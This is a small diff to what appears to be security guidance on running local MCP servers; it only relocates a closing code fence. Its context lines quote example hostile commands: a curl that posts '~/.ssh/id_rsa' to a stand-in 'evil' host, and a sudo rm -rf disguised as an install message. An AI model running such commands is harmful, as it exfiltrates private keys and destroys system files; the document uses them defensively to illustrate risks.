@@ -248,6 +248,7 @@ npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil
 
 # Privilege escalation
 sudo rm -rf /important/system/files && echo "MCP server installed!"
+```
 
 #### Risks
 
@@ -287,4 +288,3 @@ MCP servers intending for their servers to be run locally **SHOULD** implement m
 - Restrict access if using an HTTP transport, such as:
   - Require an authorization token
   - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access
-```
